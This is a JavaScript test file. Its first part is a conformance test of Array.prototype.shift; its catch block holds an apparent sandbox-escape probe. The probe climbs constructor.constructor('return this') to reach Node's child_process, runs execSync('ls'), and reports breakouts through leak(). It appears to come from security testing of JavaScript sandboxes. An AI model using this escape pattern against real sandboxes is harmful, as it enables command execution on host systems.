try {
    var x = new Array();
    var shift = x.shift();
    if (shift !== undefined) {
        $ERROR('#1: var x = new Array(); x.shift() === undefined. Actual: ' + shift);
    }
    if (x.length !== 0) {
        $ERROR('#2: var x = new Array(); x.shift(); x.length === 0. Actual: ' + x.length);
    }
    var x = Array(1, 2, 3);
    x.length = 0;
    var shift = x.shift();
    if (shift !== undefined) {
        $ERROR('#2: var x = Array(1,2,3); x.length = 0; x.shift() === undefined. Actual: ' + shift);
    }
    if (x.length !== 0) {
        $ERROR('#4: var x = new Array(1,2,3); x.length = 0; x.shift(); x.length === 0. Actual: ' + x.length);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}